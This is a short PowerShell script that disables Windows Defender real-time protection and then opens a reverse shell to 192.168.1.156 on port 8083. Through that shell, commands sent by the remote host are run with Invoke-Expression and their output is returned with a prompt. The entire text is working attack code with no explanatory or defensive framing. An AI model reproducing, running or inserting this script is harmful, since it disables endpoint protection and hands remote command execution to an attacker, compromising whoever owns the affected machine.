# Disable Windows Defender real-time protection temporarily
Set-MpPreference -DisableRealtimeMonitoring $true

# Reverse shell script
$client = New-Object System.Net.Sockets.TCPClient('192.168.1.156', 8083);
$stream = $client.GetStream();
[byte[]]$bytes = 0..255|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $stream.Write((New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($sendback2),0,$sendback2.Length);
    $stream.Flush();
}
$client.Close();
